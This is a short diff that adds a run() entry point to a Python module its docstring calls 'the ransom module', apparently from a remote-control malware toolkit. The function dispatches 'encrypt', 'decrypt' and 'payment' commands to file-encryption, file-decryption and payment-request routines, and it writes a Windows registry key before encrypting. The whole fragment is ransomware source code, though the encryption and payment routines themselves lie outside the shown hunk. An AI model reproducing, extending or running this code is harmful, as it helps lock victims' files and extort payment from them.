@@ -219,3 +219,21 @@ def decrypt_files(rsa_key):
     except Exception as e:
         util.log("{} error: {}".format(decrypt_files.func_name, str(e)))
 
+def run(args=None):
+    """ 
+    Run the ransom module
+
+    `Required`
+    :param str args:  encrypt, decrypt, payment
+
+    """
+    if args:
+        cmd, _, action = str(args).partition(' ')
+        if 'payment' in cmd:
+            return request_payment(action)
+        elif 'decrypt' in cmd:
+            return decrypt_files(action)
+        elif 'encrypt' in cmd:
+            reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
+            return encrypt_files(action)
+    return globals()['usage']
